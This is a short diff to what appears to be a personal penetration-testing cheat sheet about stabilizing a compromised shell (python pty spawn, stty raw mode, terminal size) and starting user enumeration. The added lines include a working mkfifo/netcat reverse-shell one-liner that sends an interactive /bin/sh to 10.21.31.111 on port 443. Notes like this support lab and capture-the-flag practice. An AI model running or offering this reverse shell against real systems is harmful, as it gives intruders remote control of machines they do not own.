@@ -16,8 +16,12 @@ Stabilize shell and make it interactive
 	`python3 -c 'import pty;pty.spawn("/bin/bash")'`
 	or `python -c 'import pty;pty.spawn("/bin/bash")'` if ooold python
 	Ctrl+z
+	`stty -a` (on my kali: `speed 38400 baud; rows 33; columns 126; line = 0;`)
 	`stty raw -echo; fg` (ctrl+c and other special chars sent + turning of echo)
 	`export TERM=xterm`
+	`stty rows <number> cols <number>` (on my kali: `stty rows 33 cols 126`)
+
+`mkfifo /tmp/h; cat /tmp/h | /bin/sh -i 2>&1 | nc 10.21.31.111 443 > /tmp/h`
 
 User info
 	`id` privilege level and group memberships
